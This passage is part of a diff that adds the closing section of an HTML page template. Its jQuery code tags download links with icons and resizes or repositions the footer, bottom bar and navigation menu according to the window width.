+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
